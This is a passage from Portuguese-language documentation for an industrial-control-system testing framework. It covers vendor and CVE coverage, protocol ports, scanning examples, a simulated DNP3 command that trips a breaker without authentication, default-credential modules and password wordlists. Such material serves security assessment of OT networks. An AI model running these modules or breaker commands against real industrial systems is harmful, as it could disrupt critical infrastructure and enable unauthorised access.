| GE / GE Vernova | EUA | CIMPLICITY, iFIX, Grid Solutions | 18 |
| Inductive Automation | EUA | Ignition SCADA | 5 |
| Tridium | EUA | Niagara 4 Framework | 5 |
| AVEVA / OSIsoft | EUA | System Platform, PI Historian | 14 |
| AspenTech | EUA | Aspen InfoPlus.21 historian | 1 |
| AutomationDirect | EUA | CLICK PLCs, DirectLogix | 1 |
| Red Lion Controls | EUA | Crimson 3.x HMI/SCADA | 1 |
| Opto 22 | EUA | groov EPIC, groov RIO | 1 |
| ProSoft Technology | EUA | RadioLinx, ICX35 | 2 |
| Bedrock Automation | EUA | Open Secure PLC | 1 |
| Flowserve | EUA | controladores PumpWorks | 1 |
| Weatherford | EUA | SCADA CygNet | 1 |
| Sierra Wireless | Canadá | roteadores industriais AirLink | 1 |
| Delta Controls | Canadá | ORCAview BAS | 1 |
| Automated Logic | EUA | WebCTRL BAS | 1 |
| Grundfos | Dinamarca/EUA | drives CUE pump | 2 |
| Westinghouse | EUA | Common Q Nuclear I&C | 1 |

### Brasil e LATAM

A cobertura do IXF para vendors brasileiros e latino-americanos é especialmente relevante dado o crescimento do setor industrial na região e a infraestrutura crítica nacional.

| Vendor | País | Produtos Principais | CVEs | Notas |
|--------|------|---------------------|------|-------|
| WEG | Brasil | CFW-11 VFD, Motor Scan, WEGDRIVE | 2 | Maior fabricante de motores elétricos da América Latina |
| ALTUS | Brasil | Duo PLC series, HMI Nexto | 1 | PLC amplamente usado em automação industrial nacional |
| Novus Automation | Brasil | Controladores de temperatura, transmissores | 1 | Instrumentação de processo |
| Elipse Software | Brasil | E3 SCADA, Epics, Elipse Mobile | 2 | SCADA líder no mercado brasileiro; petróleo, energia, saneamento |
| Smar | Brasil | ProcessView SCADA, LD302, DFI302 | 1 | Foundation Fieldbus e HART nativo |
| Digicon | Brasil | Concentradores de dados RTU | 1 | Telemetria para distribuição de energia |

**Contexto Brasil/LATAM:**

O Brasil possui uma infraestrutura crítica significativa gerenciada por sistemas ICS/SCADA:
- **Energia:** Operador Nacional do Sistema Elétrico (ONS), distribuidoras como Enel, Energisa, CPFL
- **Óleo e Gás:** Petrobras opera refinarias (REDUC, REPLAN, RNEST) com DCS e PLCs
- **Água e Saneamento:** SABESP, COPASA, CAESB — sistemas Modbus e SCADA WEG/Elipse
- **Manufatura:** São Paulo é hub industrial — automotivo (Volkswagen, GM, Toyota), farmacêutico, alimentício
- **Telecomunicações:** Anatel regula infraestrutura crítica de telecomunicações

**Protocolos mais comuns no Brasil:**
1. Modbus TCP/RTU — dominante em saneamento e energia distribuída
2. DNP3 — subestações e sistemas de distribuição da Eletrobras/distribuidoras
3. IEC 61850 — substações de alta tensão (CTEEP, Furnas, Eletronorte)
4. OPC UA — novos projetos de automação (Petrobras downstream)
5. PROFINET/S7comm — automação industrial (manufatura São Paulo)

**Módulos IXF específicos para ambiente Brasil/LATAM:**
```
ixf > search WEG
ixf > search Elipse
ixf > search ALTUS
ixf > use scanners/ics/modbus_detect  # Modbus onipresente no Brasil
ixf > use assessment/iec62443/zone_conduit_audit  # Conformidade ANEEL/ANP
```

---

### Ásia-Pacífico

| Vendor | País | Produtos Principais | CVEs |
|--------|------|---------------------|------|
| Yokogawa | Japão | CENTUM VP, FAST/TOOLS, STARDOM | 5 |
| Omron | Japão | controladores NX/NJ, CJ2M, CP2E | 12 |
| Mitsubishi Electric | Japão | MELSEC iQ-R/Q, GENESIS64, MELSOFT | 3 |
| FANUC | Japão | CNC, Controladores de Robô | 2 |
| Yaskawa | Japão | servo Sigma-7, controlador MP3300 | 2 |
| Keyence | Japão | PLCs Série KV | 2 |
| Panasonic | Japão | PLCs FP7 | 1 |
| Fuji Electric | Japão | MICREX-SX, HMI Monitouch | 2 |
| JTEKT | Japão | PLCs TOYOPUC | 2 |
| HIWIN | Taiwan | controladores de movimento MC Series | 1 |
| Weintek | Taiwan | HMI cMT, EasyBuilder Pro | 2 |
| Delta Electronics | Taiwan | DIAEnergie, AS-series, DVP | 11 |
| Fatek Automation | Taiwan | PLCs Série FBS | 2 |
| Vigor | Taiwan | PLCs Série VH | 1 |
| LS Electric | Coreia | PLCs Série XGK/XGI | 1 |
| Hollysys | China | MACS-S DCS, HolliField | 2 |
| Supcon | China | JX-300XP DCS | 1 |
| Inovance | China | PLCs AM600 | 1 |
| INVT | China | VFD Goodrive | 1 |
| CHINT | China | disjuntores inteligentes NTCP | 1 |
| Kinco | China | PLCs Série K5 | 1 |

### Energia / Rede Elétrica

| Vendor | Produtos Principais |
|--------|---------------------|
| Schweitzer Engineering (SEL) | Relés de proteção, SEL-5037, SEL-5056 |
| Alstom / GE Power | relés de proteção P40 Agile |
| Hitachi Energy (ABB) | RTU500, proteção Relion 670 |
| GE Multilin | relé de proteção 850F |
| Landis+Gyr | medidores inteligentes E360 |
| Itron | medidores inteligentes Riva C |

### Especializado / Outros

| Vendor | Categoria |
|--------|---------|
| PTC / ThingWorx | Plataforma IIoT |
| Cisco (IR800/IE3400) | Redes industriais |
| Teltonika | Roteadores celulares industriais |
| Framatome | I&C nuclear (TELEPERM XP) |
| Wabtec | SCADA ferroviário |
| Thales | SCADA de infraestrutura crítica |

---

## Comando `protocols`

```
ixf > protocols

  Protocolos Industriais Suportados (50 protocolos)
  ════════════════════════════════════════════════════════════════════════
  Protocolo                 Porta       Tipo      Módulos  Região
  ──────────────────────────────────────────────────────────────────────
  Modbus TCP                502 TCP     SCADA       31     Global
  Siemens S7comm            102 TCP     PLC         27     Europa/Global
  EtherNet/IP (CIP)         44818 TCP   PLC         38     Américas
  PROFINET DCP              L2 BC       PLC          8     Europa
  DNP3                      20000 TCP   SCADA       18     Américas/Aus
  BACnet/IP                 47808 UDP   BAS         12     Global
  IEC 60870-5-104           2404 TCP    SCADA       14     Europa/LATAM
  IEC 61850 MMS             102 TCP     Subestação  11     Global
  IEC 61850 GOOSE           L2 MC       Subestação   8     Global
  OPC UA                    4840 TCP    IIoT        22     Global
  OPC DA (DCOM)             135 TCP     SCADA (leg)  7     Windows/Legacy
  Omron FINS                9600 UDP    PLC         12     APAC
  Unitronics PCOM           20256 TCP   PLC          4     Global
  Beckhoff ADS/AMS          48898 TCP   PLC          5     Europa
  MQTT                      1883 TCP    IIoT         9     Global
  SNMP (OT)                 161 UDP     Mgmt         8     Global
  PROFIBUS DP/PA            1962 GW     Fieldbus     4     Europa
  HART-IP                   5094 TCP    Fieldbus     3     Global
  CANopen                   4001 GW     Machine      2     Europa
  CC-Link                   61450 UDP   Fieldbus     3     APAC
  CC-Link IE Field          61450 UDP   Fieldbus     3     APAC
  EtherCAT                  L2          Fieldbus     3     Global
  EtherNet/POWERLINK        L2          Fieldbus     2     Europa
  SERCOS III                8008 TCP    Motion       2     Europa
  IO-Link                   —           Sensors      2     Global
  INTERBUS                  1962 GW     Fieldbus     2     Europa
  ControlNet                44818 TCP   Fieldbus     3     Américas
  DeviceNet                 44818 TCP   Fieldbus     2     Américas
  PCCC                      44818 TCP   PLC (leg)    4     Américas
  FL-NET (OPCN-2)           7000 UDP    Fieldbus     1     Japão
  CompoNet                  9600 GW     Fieldbus     1     APAC
  Yokogawa Vnet/IP          20111 TCP   DCS          5     APAC/Global
  FOUNDATION Fieldbus H1    1089 HSE    DCS          3     Global
  FOUNDATION Fieldbus HSE   1089 TCP    DCS          3     Global
  LonWorks/LonTalk          1628 UDP    BAS          2     Global
  KNX/EIB                   3671 UDP    BAS          4     Europa
  CIP Safety                44818 TCP   Safety       3     Américas
  PROFIsafe                 502/PROF    Safety       2     Europa
  FSoE                      L2          Safety       2     Europa
  SECS/GEM (HSMS)           5000 TCP    Semicond.    3     APAC/EUA
  Serial-to-Ethernet        4001 TCP    Serial GW    4     Global
  ──────────────────────────────────────────────────────────────────────
  Total: 50 protocolos | 276+ módulos de protocolo
```

---

## Adicionando Cobertura para um Novo Vendor

Para escanear dispositivos de um novo vendor:

```bash
# Usar o scanner Modbus genérico
ixf > use scanners/ics/modbus_scanner
ixf > set target 192.168.1.0/24
ixf > run

# Ou usar um scanner específico de protocolo
ixf > use scanners/ics/s7_comm_scanner
ixf > set target 192.168.1.100

# Verificar credenciais padrão
ixf > search default_creds
ixf > use creds/generic/http_default

# Scanner de portas OT (varredura de porta industrial)
ixf > use scanners/network/ot_port_sweep
ixf > set target 10.0.0.0/16
ixf > run
```

**Para adicionar um módulo para novo vendor/protocolo:**
1. Verificar [Guia de Desenvolvimento de Módulos](09-desenvolvimento-modulos.md)
2. Criar arquivo em `cve/<vendor>/` ou `exploits/protocols/<protocolo>/`
3. Declarar `__info__` com campos de vendor corretos
4. Implementar `check()` (sonda de protocolo nativo do vendor)
5. Implementar `run()` com ramo simulate/live

---

---

## Exemplos de Uso por Protocolo

### Varredura Modbus completa em laboratório OT

```
# 1. Detectar dispositivos Modbus na rede
ixf > use scanners/ics/modbus_detect
ixf > set target 192.168.1.0/24
ixf > run

# 2. Fingerprint de vendor via FC43
ixf > use exploits/protocols/modbus/modbus_device_fingerprint
ixf > set target 192.168.1.100
ixf > run

# Saída:
[*] [SIMULATE] Modbus FC43 Device Identification
    Objeto 0x00 (VendorName):     Schneider Electric
    Objeto 0x01 (ProductCode):    Modicon M340
    Objeto 0x02 (MajorMinorRevision): V3.10 Build 4
    Objeto 0x03 (VendorURL):      https://www.schneider-electric.com
    Objeto 0x04 (ProductName):    Modicon M340 CPU Module

# 3. Varrer técnicas MITRE de modificação
ixf > ttp-check T0836 192.168.1.100  # Modify Parameter
ixf > ttp-check T0831 192.168.1.100  # Manipulation of Control
```

### Varredura S7comm em rede Siemens

```
# Descobrir todos os CLPs Siemens na rede
ixf > use scanners/ics/s7_comm_scanner
ixf > set target 192.168.1.0/24
ixf > run

# [SIMULATE] S7comm Discovery Scan
# Probe ISO-TSAP TCP/102 para todos os hosts
# S7comm Setup Communication → PDU Type: 1 (Job)
# Verificar resposta: S7comm Ack-Data com PDU Type: 2 (Ack)

# Resultado esperado por host:
# 192.168.1.50 → Siemens S7-1200 CPU 1215C
# 192.168.1.51 → Siemens S7-1500 CPU 1515-2

# CVE direto para S7
ixf > cve CVE-2021-22681
ixf > set target 192.168.1.50
ixf > check
ixf > run
```

### Varredura BACnet/IP com enumeration completa

```
ixf > use scanners/ics/bacnet_scanner
ixf > run  # Broadcast — não precisa de target específico

# [SIMULATE] BACnet Who-Is Broadcast (0x08)
# Broadcast para 255.255.255.255:47808 (UDP)
# Aguardar I-Am responses de todos os dispositivos

# Dispositivos esperados (exemplo):
# Device 1001: Honeywell WEB-600 (HVAC)
# Device 2034: Johnson Controls VMA1640 (VAV)
# Device 5500: Schneider AS-B3976 (BMS)

ixf > use exploits/protocols/bacnet/bacnet_read_property
ixf > set target 192.168.1.100
ixf > set device_id 1001
ixf > run

# [SIMULATE] BACnet ReadProperty
# Object: Device (instance 1001)
# Property: All → enumerar todas as propriedades
# Resultado: dados de configuração, lista de objetos, horários, etc.
```

### Ataque DNP3 simulado — Direct Operate sem SAv5

```
ixf > use exploits/protocols/dnp3/dnp3_direct_operate
ixf > set target 192.168.1.200
ixf > set point_index 5
ixf > set function TRIP
ixf > run

# [SIMULATE] DNP3 Direct Operate
# Link Layer: Source=1, Destination=3, Function=0x44 (Data)
# Transport Layer: FIR=1, FIN=1, Sequence=0
# Application Layer: Function Code=3 (Direct Operate)
#   Object Group 12 Var 1 (Control Relay Output Block):
#     Control Code: 0x03 (TRIP) | Count: 1 | On Time: 0 | Off Time: 0
#
# Resultado esperado: disjuntor/relé no ponto 5 → TRIP (aberto)
# Sem SAv5: NENHUMA AUTENTICAÇÃO NECESSÁRIA
# MITRE: T0813, T0814, T0879
```

---

## CVEs Mais Críticos por Protocolo

| Protocolo | CVE | CVSS | Vendor Afetado | Impacto |
|-----------|-----|------|----------------|---------|
| Modbus TCP | CVE-2018-7789 | 7.5 | Schneider Modicon M340 | DoS |
| S7comm | CVE-2021-22681 | 9.8 | Siemens S7-1200/1500 | RCE/MitM |
| S7comm | CVE-2022-38465 | 9.3 | Siemens S7-1500 | Hijacking |
| EtherNet/IP | CVE-2022-1161 | 9.8 | Rockwell ControlLogix | Firmware Mod |
| OPC UA | CVE-2021-39139 | 9.8 | Multiple OPC UA Stacks | RCE |
| DNP3 | CVE-2019-10967 | 7.5 | Triangle MicroWorks | DoS |
| BACnet | CVE-2023-29869 | 9.8 | Honeywell WEB-600 | Auth Bypass |
| IEC 61850 | CVE-2022-3924 | 7.5 | Hitachi Energy RTUs | DoS |
| IEC 104 | CVE-2022-3929 | 9.8 | Hitachi MicroSCADA | Auth Bypass |
| FINS | CVE-2023-27396 | 9.8 | Omron NJ/NX Series | DoS/RCE |
| PCOM | CVE-2023-6448 | 9.8 | Unitronics Vision | Default Creds |
| MQTT | CVE-2017-7650 | 7.5 | Mosquitto < 1.4.15 | Auth Bypass |
| SNMP | CVE-2017-6736 | 9.8 | Cisco IOS | RCE |
| ADS/AMS | CVE-2019-5637 | 9.8 | Beckhoff TwinCAT | RCE |

---

## Cobertura Geográfica por Setor Industrial

### Cobertura Setorial do IXF

| Setor | Vendors Cobertos | Protocolos Principais | CVEs |
|-------|-----------------|----------------------|------|
| Energia Elétrica | 12 | IEC 61850, DNP3, IEC 104 | 45 |
| Petróleo e Gás | 18 | Modbus, HART, Foundation FF | 62 |
| Água e Saneamento | 8 | Modbus, SCADA web | 18 |
| Manufatura | 35 | Modbus, EtherNet/IP, PROFINET | 180 |
| Automação Predial | 10 | BACnet, KNX, LonWorks | 22 |
| Semicondutores | 3 | SECS/GEM, EtherNet/IP | 8 |
| Farmacêutico | 5 | Modbus, OPC UA, SCADA | 12 |
| Ferroviário | 4 | IEC 61375, Ethernet IP | 6 |
| Nuclear | 3 | Modbus, FINS, DCS proprietário | 5 |
| Mineração | 7 | Modbus, PROFIBUS, WirelessHART | 15 |

---

---

## Referência de Portas por Protocolo

Tabela de referência rápida de todas as portas usadas por protocolos industriais no IXF:

| Protocolo | TCP/UDP | Porta | Observação |
|-----------|---------|-------|-----------|
| Modbus TCP | TCP | 502 | Padrão universal |
| S7comm / S7comm+ | TCP | 102 | ISO-TSAP (TPKT/COTP) |
| EtherNet/IP | TCP | 44818 | CIP sobre TCP |
| EtherNet/IP (UDP) | UDP | 2222 | CIP sobre UDP |
| DNP3 | TCP/UDP | 20000 | SCADA elétrico |
| BACnet/IP | UDP | 47808 | Automação predial |
| OPC UA | TCP | 4840 | Padrão (pode variar) |
| OPC DA/DCOM | TCP | 135 + dinâmicas | Legado Windows |
| IEC 60870-5-104 | TCP | 2404 | RTU subestações |
| IEC 61850 MMS | TCP | 102 | Subestações modernas |
| Omron FINS/UDP | UDP | 9600 | CLPs Omron |
| Omron FINS/TCP | TCP | 9600 | CLPs Omron |
| Unitronics PCOM | TCP | 20256 | Vision/Unistream |
| Beckhoff ADS | TCP | 48898 | TwinCAT runtime |
| MQTT | TCP | 1883 | IIoT sem TLS |
| MQTT-TLS | TCP | 8883 | IIoT com TLS |
| SNMP | UDP | 161 | Network management |
| SNMP Trap | UDP | 162 | Alertas SNMP |
| CC-Link | UDP | 61450 | Mitsubishi |
| FL-NET | UDP | 7000 | Fuji Electric |
| Yokogawa Vnet/IP | UDP | 20111 | CENTUM DCS |
| Beckhoff EtherCAT | L2 | — | Frame Ethernet direto |
| PROFINET DCP | L2 | — | Broadcast Layer 2 |
| IEC 61850 GOOSE | L2 | — | Multicast Layer 2 |

---

## Guia de Seleção de Módulo por Protocolo

### Como escolher o módulo certo para cada protocolo

```
# Para um dispositivo desconhecido, começar sempre pela descoberta
ixf > search modbus         # Lista todos os módulos Modbus
ixf > search s7comm         # Lista todos os módulos Siemens S7
ixf > search bacnet         # Lista todos os módulos BACnet

# Para CVEs específicos do vendor
ixf > search schneider      # Todos CVEs Schneider
ixf > search rockwell       # Todos CVEs Rockwell

# Para credenciais padrão por vendor
ixf > search default_creds siemens   # Credenciais padrão Siemens
ixf > search default_creds modicon   # Credenciais padrão Modicon
```

### Hierarquia de módulos por agressividade

Para cada protocolo, seguir esta progressão de menor para maior impacto:

| Fase | Módulo | Impacto | Exemplo |
|------|--------|---------|---------|
| 1. Detectar | `scanners/ics/<protocolo>_detect` | READ | `modbus_detect` |
| 2. Fingerprint | `scanners/ics/<protocolo>_fingerprint` | READ | `modbus_device_fingerprint` |
| 3. Ler dados | `exploits/protocols/<protocolo>/read_*` | READ | `modbus_read_registers` |
| 4. Check CVEs | `cve/<vendor>/<cve>.check()` | READ | via `ttp-check T0888` |
| 5. Testar creds | `creds/<vendor>/*_default_creds` | MEDIUM | `simatic_default_creds` |
| 6. Modificar | `exploits/protocols/<protocolo>/write_*` | MEDIUM-HIGH | `modbus_write_register` |
| 7. Explorar CVE | `cve/<vendor>/<cve>.run()` | CRITICAL | `cve_2021_22681` |

---

## Protocolos por Versão e Segurança

### Versões com e sem recursos de segurança

| Protocolo | Versão Insegura | Versão Segura | Diferença |
|-----------|----------------|---------------|-----------|
| Modbus | Modbus TCP (original) | Modbus Secure (RFC 9202) | TLS 1.3 + certificados |
| DNP3 | DNP3 < 3.0 | DNP3 SAv5 (IEC 62351-5) | Challenge-response HMAC |
| OPC UA | SecurityMode=None | SecurityMode=SignAndEncrypt | TLS 1.2+ + certs |
| IEC 61850 | GOOSE sem auth | GOOSE IEC 62351-6 | HMAC-SHA-256 |
| IEC 104 | Sem autenticação | IEC 62351-3/5 | TLS + SAv5 |
| PROFINET | DCP sem auth | PROFIsafe | Safety layer |
| S7comm | S7comm (S7-300) | S7comm+ (S7-1200) | TLS (mas CVE-2021-22681) |

---

## Testando Novos Protocolos — Workflow Genérico

Para protocolos não listados no IXF, use o módulo genérico de socket:

```
ixf > use exploits/protocols/serial/raw_tcp_probe
ixf > set target 192.168.1.100
ixf > set port 4000          # Porta do protocolo desconhecido
ixf > set probe_hex "10 01 61 64 6D 69 6E 00"  # Probe customizado
ixf > run

[*] [SIMULATE] Raw TCP Probe
    Conectar a 192.168.1.100:4000
    Enviar probe hex: 10 01 61 64 6D 69 6E 00
    Capturar resposta e exibir em hex + ASCII
    Análise: comparar com padrões de protocolos industriais conhecidos
```

---

---

## Módulos de Credenciais Padrão por Vendor

O IXF inclui 62 módulos de teste de credenciais padrão cobrindo os principais vendors OT:

```
ixf > search default_creds

[+] 62 module(s) found:
  use creds/siemens/simatic_default_creds
  use creds/siemens/wincc_default_creds
  use creds/rockwell/plc_default_creds
  use creds/rockwell/studio5000_default_creds
  use creds/schneider/modicon_default_creds
  use creds/schneider/citect_default_creds
  use creds/honeywell/experion_default_creds
  use creds/abb/ac500_default_creds
  use creds/emerson/deltav_default_creds
  use creds/emerson/roc800_default_creds
  use creds/ge/ifx_default_creds
  use creds/yokogawa/centum_default_creds
  use creds/omron/nx_default_creds
  use creds/mitsubishi/melsec_default_creds
  use creds/beckhoff/twincat_default_creds
  use creds/unitronics/vision_default_creds
  use creds/inductive/ignition_default_creds
  use creds/aveva/wonderware_default_creds
  use creds/moxa/nport_default_creds
  use creds/cisco/ir_router_default_creds
  …e mais 42 módulos de credenciais
```

### Estratégia de teste de credenciais

```
# 1. Identificar vendor via fingerprint
ixf > use scanners/ics/modbus_device_fingerprint
ixf > set target 192.168.1.100
ixf > run   # Identifica vendor do dispositivo

# 2. Buscar módulo de credenciais para o vendor identificado
ixf > search <vendor_identificado>

# 3. Testar credenciais padrão
ixf > use creds/<vendor>/<protocolo>_default_creds
ixf > set target 192.168.1.100
ixf > run   # simulate=True — mostra credenciais que seriam testadas
```

---

## Wordlists de Protocolo Incluídas

O IXF inclui wordlists específicas para protocolos OT em `industrialxpl/resources/wordlists/`:

| Arquivo | Entradas | Conteúdo |
|---------|---------|---------|
| `ics_common_passwords.txt` | 500+ | Senhas padrão comuns em dispositivos OT/ICS |
| `siemens_default_creds.txt` | 45 | Pares user:pass padrão Siemens |
| `rockwell_default_creds.txt` | 38 | Pares user:pass padrão Rockwell |
| `schneider_default_creds.txt` | 42 | Pares user:pass padrão Schneider |
| `honeywell_default_creds.txt` | 30 | Pares user:pass padrão Honeywell |
| `generic_ot_usernames.txt` | 200 | Usernames comuns em OT (admin, operator, plc, eng...) |
| `plc_default_passwords.txt` | 300+ | Senhas de CLPs de múltiplos vendors |
| `scada_web_passwords.txt` | 150 | Senhas de IHMs e SCADA web |

---

*Anterior: [SAST / LLM](07-sast-llm.md) | Próximo: [Desenvolvimento de Módulos](09-desenvolvimento-modulos.md)*
